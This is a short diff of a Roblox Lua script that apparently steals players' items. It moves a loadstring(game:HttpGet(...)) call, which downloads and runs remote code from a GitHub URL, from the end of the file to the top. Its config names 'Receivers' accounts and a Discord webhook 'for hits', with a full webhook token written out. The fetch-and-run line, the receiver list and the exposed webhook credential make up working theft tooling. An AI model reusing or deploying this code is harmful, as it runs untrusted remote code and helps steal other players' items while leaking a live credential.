@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ro-Xcripts/Roblox-Scripts/refs/heads/main/Murder%20Mystery%202", true))()
+
 Config = {
     Receivers = {"QuadCoreDragon", "1LazySly8"}, -- You Username/s.
     Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-", -- Your webhook for hits.
@@ -601,5 +603,3 @@ if LoadingScreenValue ~= false then
 	wait(0.5) -- Short wait before closing
 	Loading:Destroy() -- Close loading screen
 end
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Ro-Xcripts/Roblox-Scripts/refs/heads/main/Murder%20Mystery%202", true))()
